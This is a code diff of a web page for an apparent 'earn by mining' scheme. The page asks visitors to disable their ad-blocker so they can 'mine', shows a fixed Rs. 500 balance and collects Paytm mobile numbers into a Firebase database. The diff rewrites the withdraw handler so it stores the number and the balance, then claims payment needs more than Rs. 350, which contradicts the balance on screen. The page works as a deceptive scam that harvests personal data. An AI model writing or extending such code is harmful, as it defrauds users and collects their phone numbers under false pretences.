@@ -11,6 +11,7 @@
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-113654796-1"></script>
 <script>
+window.alert("Please turn off ad-blocker for this page in order to mine succesfully!!");
   // Initialize Firebase
   var config = {
     apiKey: "AIzaSyDho5ZexO-GOyzoeta1xH1DS3SCXLCHzOQ",
@@ -21,8 +22,6 @@
     messagingSenderId: "1085619418851"
   };
   firebase.initializeApp(config);
-    console.log(firebase);
-    window.alert("Please turn off ad-blocker for this page in order to mine succesfully!!");
 </script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -156,12 +155,12 @@ var x = setInterval(function() {
   <label>Earning rate(per day): Rs. 50-100</label>
   <br>
   <label>Balance: </label>
-  <div id="shiva">Rs.<span class="count">500</span></div>
+  <div id="shiva">Rs.<span id="count" class="count">500</span></div>
   <br>
   <label><b>Enter Paytm Registered mobile number:</b></label>
 
 <textarea placeholder="Enter number here..." id="numbers" style="height: 35px; width: 150px;"></textarea>
-<button type="button" class="btn btn-info" onclick="myFunction()" id="withdraw">Withdraw</button>
+<button type="button" class="btn btn-info" onclick="myFunction1()" id="withdraw">Withdraw</button>
 
 
       <h2>Early Bird sign up Ended!</h2><a href="login.html"><button type="button" class="btn btn-info">Log In</button></a>
@@ -263,15 +262,19 @@ $('.count').each(function () {
         }
     });
 });
-
+var firebaseRef= firebase.database().ref();;
 var paynum= document.getElementById("numbers");
 var withdraw= document.getElementById("numbers");
-    var withdrawbtn= document.getElementById("withdraw");
 var withdrawbtn= document.getElementById("withdraw");
-    function myFunction(){
-        var firebaseRef= firebase.database().ref();
+var counter= document.getElementById("count");
+    function myFunction1(){
         var msgtext= withdraw.value;
-        firebaseRef.push().set(msgtext);
+        var count= counter.innerHTML;
+        var data= {
+          count, msgtext
+        }
+
+        firebaseRef.push(data);
         window.alert("We have received your withdrawal request; however your payment will only process once you accumulate more than Rs. 350 in your balance.");
     }
 </script>
